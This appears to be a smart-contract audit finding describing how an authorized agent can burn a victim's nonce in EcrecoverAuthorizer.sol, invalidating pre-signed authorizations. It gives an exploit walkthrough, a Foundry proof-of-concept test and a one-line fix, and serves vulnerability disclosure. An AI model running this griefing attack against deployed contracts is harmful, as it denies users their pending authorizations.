### Title
Authorized agent can grief victim's pending pre-signed authorization by submitting a no-op re-authorization to increment nonce - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a valid signature from any Midnight-authorized agent of the authorizer, not only the authorizer themselves. Because the nonce is unconditionally incremented on every successful call, an authorized agent can submit a no-op re-authorization (e.g., re-authorizing `EcrecoverAuthorizer` when it is already authorized) to burn the victim's current nonce and invalidate any pending pre-signed authorization at the cost of a single transaction.

### Finding Description
**Code path and root cause**

`EcrecoverAuthorizer.setIsAuthorized` (lines 24–48) performs two relevant operations unconditionally:

1. **Nonce increment** — line 26 post-increments `nonce[authorization.authorizer]` before the signature check:
   ```solidity
   require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());
   ``` [1](#0-0) 

2. **Authorized-agent signer path** — lines 33–36 accept any signer who is authorized by the authorizer on Midnight, not only the authorizer themselves:
   ```solidity
   require(
       signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
       Unauthorized()
   );
   ``` [2](#0-1) 

The downstream call on lines 46–47 writes `isAuthorized[victim][EcrecoverAuthorizer] = true` on Midnight, which is a no-op when the value is already `true`: [3](#0-2) 

**Attacker inputs and exploit flow**

Preconditions:
- `midnight.isAuthorized(victim, attacker) == true` (attacker is an authorized agent of victim — e.g., a delegated keeper or relayer)
- `midnight.isAuthorized(victim, EcrecoverAuthorizer) == true` (victim has already authorized `EcrecoverAuthorizer`, the normal setup)
- Victim has pre-signed `Authorization{authorizer=victim, authorized=X, isAuthorized=Y, nonce=N, deadline=T}` and is waiting for it to be submitted

Attack:
1. Attacker constructs `Authorization{authorizer=victim, authorized=EcrecoverAuthorizer, isAuthorized=true, nonce=N, deadline=future}`.
2. Attacker signs this struct with **their own private key** (not the victim's).
3. Attacker calls `ecrecoverAuthorizer.setIsAuthorized(auth, attackerSig)`.

Execution:
- Line 25: deadline check passes.
- Line 26: `N == nonce[victim]` passes; `nonce[victim]` becomes `N+1`.
- Lines 28–31: digest computed; `ecrecover` returns attacker's address.
- Line 32: `signer != address(0)` passes.
- Lines 33–36: `signer == victim` is false; `isAuthorized(victim, attacker)` is true → passes.
- Lines 46–47: `setIsAuthorized(EcrecoverAuthorizer, true, victim)` on Midnight — no-op.

Result: `nonce[victim]` is now `N+1`. The victim's pre-signed authorization carrying nonce `N` now reverts with `InvalidNonce` when submitted. [4](#0-3) 

**Why existing checks fail**

The `Unauthorized()` guard is satisfied by the authorized-agent path. There is no guard against no-op state changes, and no guard restricting nonce consumption to the authorizer's own signature. The Certora spec confirms nonce always increments on success but does not constrain who the signer may be relative to the authorizer: [5](#0-4) 

### Impact Explanation
Any pending pre-signed `Authorization` (nonce=N) held by the victim is permanently invalidated after the attacker's single transaction. The victim must re-sign with nonce=N+1, which the attacker can immediately invalidate again. This constitutes a sustained, low-cost DoS against any protocol action that depends on a pre-signed authorization being submitted (e.g., a relayer submitting a `take`, `repay`, `withdraw`, `liquidate`, or `claimFee` on behalf of the victim via `EcrecoverAuthorizer`).

### Likelihood Explanation
**Preconditions**: The attacker must already be a Midnight-authorized agent of the victim. This is a realistic precondition: users routinely authorize keeper bots, relayers, or third-party contracts. A malicious or compromised authorized agent can execute this attack. The attack is repeatable at the cost of one transaction per nonce invalidation and requires no special tokens, funds, or oracle conditions.

### Recommendation
Remove the authorized-agent signer path from `EcrecoverAuthorizer.setIsAuthorized`. The contract's sole purpose is to allow the authorizer to sign off-chain; if an on-chain authorized agent wants to change authorization state, they can call `Midnight.setIsAuthorized` directly (which already accepts authorized agents). The fix is:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

replacing lines 33–36. This eliminates the griefing vector entirely while preserving all legitimate use cases. [2](#0-1) 

### Proof of Concept
```solidity
// Foundry unit test
function testNonceGriefByAuthorizedAgent() public {
    // Setup: victim authorizes EcrecoverAuthorizer and attacker on Midnight
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Victim pre-signs Authorization with nonce=0 (e.g., to authorize lender)
    Authorization memory victimAuth = Authorization({
        authorizer: victim,
        authorized: lender,
        isAuthorized: true,
        nonce: 0,
        deadline: block.timestamp + 1 days
    });
    Signature memory victimSig = signAuthorization(victimAuth, victim);

    // Attacker constructs no-op re-authorization and signs with own key
    Authorization memory noopAuth = Authorization({
        authorizer: victim,
        authorized: address(ecrecoverAuthorizer),
        isAuthorized: true,  // already true — no-op
        nonce: 0,
        deadline: block.timestamp + 1 days
    });
    Signature memory attackerSig = signAuthorization(noopAuth, attacker);

    // Attacker submits no-op, burning nonce=0
    vm.prank(attacker);
    ecrecoverAuthorizer.setIsAuthorized(noopAuth, attackerSig);

    // Assert: nonce incremented
    assertEq(ecrecoverAuthorizer.nonce(victim), 1);

    // Assert: victim's pre-signed auth now reverts with InvalidNonce
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);
}
```

Expected assertions: `nonce[victim] == 1` after attacker's call; victim's pre-signed authorization reverts with `InvalidNonce`.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** certora/specs/EcrecoverAuthorizer.spec (L11-21)
```text
/// EcrecoverAuthorizer increments nonce on success and does not change other nonces.
rule effects(env e, EcrecoverAuthorizer.Authorization authorization, EcrecoverAuthorizer.Signature signature, address other) {
    require other != authorization.authorizer;
    uint256 nonceBefore = nonce(authorization.authorizer);
    uint256 otherNonceBefore = nonce(other);

    setIsAuthorized(e, authorization, signature);

    assert nonce(authorization.authorizer) == nonceBefore + 1;
    assert nonce(other) == otherNonceBefore;
}
```
